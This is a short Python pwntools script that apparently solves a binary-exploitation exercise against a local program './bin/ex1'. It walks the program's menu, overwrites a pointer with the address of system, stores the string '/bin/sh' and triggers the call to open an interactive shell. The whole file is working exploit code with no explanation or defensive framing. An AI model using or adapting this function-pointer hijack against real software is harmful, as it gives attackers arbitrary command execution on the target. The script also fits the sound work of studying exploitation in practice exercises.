#!/usr/bin/env python3

from pwn import *

system = 0x401140

target = process("./bin/ex1")

target.sendline(b"4\n")
target.sendline(b"5\n")

target.sendline(b"1\n")
target.sendline(b"0")
target.sendline(p64(system))
target.sendline(b"helo")

target.sendline(b"1\n")
target.sendline(b"1")
target.sendline(b"/bin/sh\n")

target.sendline(b"2\n")
target.sendline(b"1")

target.interactive()